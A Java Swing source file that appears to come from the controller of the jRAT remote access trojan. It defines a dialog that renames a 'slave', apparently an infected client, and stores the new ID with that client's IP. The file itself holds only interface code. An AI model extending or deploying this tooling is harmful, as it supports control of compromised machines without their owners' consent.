package jrat.controller.ui.frames;

import jrat.controller.AbstractSlave;
import jrat.controller.Main;
import jrat.controller.Slave;
import jrat.controller.settings.SettingsCustomID;

import javax.swing.*;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.border.EmptyBorder;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;


@SuppressWarnings("serial")
public class FrameRename extends BaseFrame {

    private JTextField txtNewID;

    public FrameRename(Slave slave) {
		super(slave);
		final AbstractSlave sl = slave;
		setTitle("Rename");
		setResizable(false);
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRename.class.getResource("/rename.png")));
		setDefaultCloseOperation(DISPOSE_ON_CLOSE);
		setBounds(100, 100, 293, 126);
        JPanel contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);

		JLabel lblOldId = new JLabel("Old ID:");

        JTextField txtOldID = new JTextField(slave.getID());
		txtOldID.setEditable(false);
		txtOldID.setColumns(10);

		JLabel lblNewId = new JLabel("New ID:");

		txtNewID = new JTextField();
		txtNewID.setColumns(10);

        JButton btnRename = new JButton("Rename");
		btnRename.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				SettingsCustomID.getGlobal().add(txtNewID.getText(), sl.getID(), sl.getRawIP());
				for (AbstractSlave slave : Main.instance.getPanelClients().getSelectedSlaves()) {

					if (slave != null && slave.equals(sl)) {
						slave.setRenamedID(txtNewID.getText());
						break;
					}
				}
				
				Main.instance.repaint();
				setVisible(false);
				dispose();
			}
		});
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGap(4).addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING).addComponent(btnRename).addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGap(10).addComponent(lblOldId).addGap(4).addComponent(txtOldID, GroupLayout.PREFERRED_SIZE, 217, GroupLayout.PREFERRED_SIZE)).addGroup(gl_contentPane.createSequentialGroup().addGap(4).addComponent(lblNewId).addGap(5).addComponent(txtNewID, GroupLayout.PREFERRED_SIZE, 217, GroupLayout.PREFERRED_SIZE)))).addContainerGap(12, Short.MAX_VALUE)));
		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGap(11).addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGap(3).addComponent(lblOldId)).addComponent(txtOldID, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)).addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGap(9).addComponent(lblNewId)).addGroup(gl_contentPane.createSequentialGroup().addGap(5).addComponent(txtNewID, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))).addPreferredGap(ComponentPlacement.RELATED, 9, Short.MAX_VALUE).addComponent(btnRename)));
		contentPane.setLayout(gl_contentPane);
	}
}
